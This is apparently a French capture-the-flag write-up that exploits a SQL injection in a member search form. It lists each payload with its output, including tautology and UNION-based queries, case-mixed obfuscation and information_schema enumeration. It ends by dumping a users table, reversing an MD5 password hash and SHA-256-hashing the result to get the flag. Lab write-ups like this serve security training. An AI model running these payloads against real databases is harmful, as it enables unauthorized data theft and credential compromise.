# SQL Injection Members

- On voit que dans cette entrée il y a une injection SQL
- On commence donc par recuperé toute les données
```
# Injection
1 OR 1=1
# Result
ID: 1 OR 1=1 
First name: Barack Hussein
Surname : Obama

ID: 1 OR 1=1 
First name: Adolf
Surname : Hitler

ID: 1 OR 1=1 
First name: Joseph
Surname : Staline

ID: 1 OR 1=1 
First name: Flag
Surname : GetThe
```
- Une entrée s'apelle GetThe Flag. On comprend donc qu'il faut y recuperer les autres colonnes
- On recupere le nom de notre Database
```
# Injection
1 UNION SELECT version(),database()
# Result
ID: 1 UNION SELECT version(),database()
First name: 5.5.44-0ubuntu0.12.04.1
Surname : Member_Sql_Injection
```
- On recupere ensuite la table
```
# Injection
1 UniOn Select 1,gRoUp_cOncaT(0x7c,table_name,0x7C) fRoM information_schema.tables wHeRe table_schema=database()
# Result
ID: 1 UniOn Select 1,gRoUp_cOncaT(0x7c,table_name,0x7C) fRoM information_schema.tables wHeRe table_schema=database()
First name: 1
Surname : |users|
```
- Puis les differentes colonnes
```
# Injection
1 UNION ALL SELECT column_name,table_name from information_schema.columns
# Result
ID: 1 UNION ALL SELECT column_name,table_name from information_schema.columns
First name: user_id
Surname : users

ID: 1 UNION ALL SELECT column_name,table_name from information_schema.columns
First name: first_name
Surname : users

ID: 1 UNION ALL SELECT column_name,table_name from information_schema.columns
First name: last_name
Surname : users

ID: 1 UNION ALL SELECT column_name,table_name from information_schema.columns
First name: town
Surname : users

ID: 1 UNION ALL SELECT column_name,table_name from information_schema.columns
First name: country
Surname : users

ID: 1 UNION ALL SELECT column_name,table_name from information_schema.columns
First name: planet
Surname : users

ID: 1 UNION ALL SELECT column_name,table_name from information_schema.columns
First name: Commentaire
Surname : users
```
- Maintentant on peut recuperer les differentes informations
```
# Injection
1 UNION SELECT concat(user_id,char(58),first_name,char(58),last_name,char(58),town,char(58),country,char(58),planet,char(58),Commentaire,char(58),countersign),2 FROM users
# Result
First name: 5:Flag:GetThe:42:42:42:Decrypt this password -> then lower all the char. Sh256 on it and it's good !:5ff9d0165b4f92b14994e5c685cdce28
```
- On fait donc se que nous dit le commentaire
- On voit qu'il y a un hash. On le reverse donc sur l'[internet](https://md5.gromweb.com/?md5=5ff9d0165b4f92b14994e5c685cdce28)

5ff9d0165b4f92b14994e5c685cdce28 => FortyTwo => 10a16d834f9b1e4068b25c4c46fe0284e99e44dceaf08098fc83925ba6310ff5
